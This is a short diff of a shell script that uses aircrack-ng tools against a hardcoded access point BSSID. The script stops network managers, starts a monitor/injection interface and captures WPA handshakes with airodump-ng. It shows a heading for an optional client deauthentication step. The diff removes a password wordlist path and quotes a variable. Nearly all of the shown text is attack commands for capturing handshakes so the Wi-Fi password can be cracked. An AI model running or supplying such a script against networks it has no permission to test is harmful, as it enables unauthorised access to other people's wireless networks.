@@ -11,7 +11,6 @@
 # ank kill Network manager to disable channel hopping.
 
 BSSID='54:E6:FC:BC:50:FE'
-DICT=/usr/share/doc/aircrack-ng-1.1/test/password.lst
 
 echo
 echo "1. Stopping network cards and processes..."
@@ -23,7 +22,7 @@ sudo airmon-ng start wlan0 2 check kill  # creates 'mon0' injection interface, t
 # Execute
 echo
 echo "2. Capture]ing handshakes..."
-sudo airodump-ng -c 2 --bssid $BSSID -w psk mon0  # is this correct?
+sudo airodump-ng -c 2 --bssid "$BSSID" -w psk mon0  # is this correct?
 
 echo
 echo "3. (optional) Deautenticate client..."
